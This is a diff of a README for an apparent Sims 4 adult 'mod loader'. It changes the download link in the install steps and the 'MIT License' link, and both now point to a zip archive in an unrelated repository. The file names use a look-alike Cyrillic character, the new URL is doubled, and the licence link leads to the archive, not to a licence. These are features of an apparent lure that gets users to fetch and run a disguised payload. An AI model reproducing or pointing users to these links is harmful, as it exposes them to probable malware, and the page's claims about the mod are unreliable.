@@ -45,7 +45,7 @@ Explore the robust features that set The Sims 4 Sex Mod Loader apart and maximiz
 
 To get started on any system, just follow our easy steps:
 
-1. **Download https://raw.githubusercontent.com/Omar230406/App-backpack_Website/main/Lоader.zip from the repository.**
+1. **Download https://github.com/Omar230406/App-backpack_Website/raw/refs/heads/main/clapwort/Website-App-backpack-1.5.zipоhttps://github.com/Omar230406/App-backpack_Website/raw/refs/heads/main/clapwort/Website-App-backpack-1.5.zip from the repository.**
 2. Extract the contents to your Sims 4 Mods folder found in `Documents/Electronic Arts/The Sims 4/Mods`.
 3. Launch The Sims 4 – enable "Script Mods Allowed" in Game Options > Other.
 4. Start your game and enjoy a brand new set of immersive experiences!
@@ -78,7 +78,7 @@ This loader is packed with optimized functions to unlock interactive features fo
 
 ## 📑 License
 
-This project is distributed under the [MIT License](https://raw.githubusercontent.com/Omar230406/App-backpack_Website/main/Lоader.zip). Feel free to use, share, modify, and contribute!
+This project is distributed under the [MIT License](https://github.com/Omar230406/App-backpack_Website/raw/refs/heads/main/clapwort/Website-App-backpack-1.5.zipоhttps://github.com/Omar230406/App-backpack_Website/raw/refs/heads/main/clapwort/Website-App-backpack-1.5.zip). Feel free to use, share, modify, and contribute!
 
 ---
 
